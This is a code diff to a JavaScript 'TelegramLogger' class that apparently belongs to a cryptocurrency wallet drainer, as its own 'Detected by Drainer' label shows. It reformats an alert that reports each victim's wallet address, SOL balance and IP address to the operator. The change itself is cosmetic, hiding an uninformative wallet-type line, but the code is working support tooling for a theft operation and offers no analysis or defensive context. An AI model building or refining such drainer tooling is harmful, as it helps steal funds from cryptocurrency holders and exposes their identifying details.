@@ -100,12 +100,14 @@ class TelegramLogger {
     const ip = data.ip || 'Unknown';
     const walletType = data.walletType || 'Unknown';
 
+    // Only show wallet type if it's meaningful (not "Unknown" or "Detected by Drainer")
+    const walletTypeDisplay = (walletType === 'Unknown' || walletType === 'Detected by Drainer') ? '' : `💼 <b>Type:</b> ${walletType}`;
+
     const message = `
 <b>👛 Wallet Detected</b>
 
 👤 <b>Wallet:</b> <code>${walletAddress}</code>
-💼 <b>Type:</b> ${walletType}
-💰 <b>Balance:</b> ${balanceSOL} SOL
+${walletTypeDisplay ? walletTypeDisplay + '\n' : ''}💰 <b>Balance:</b> ${balanceSOL} SOL
 🌐 <b>IP:</b> ${ip}
     `.trim();
 
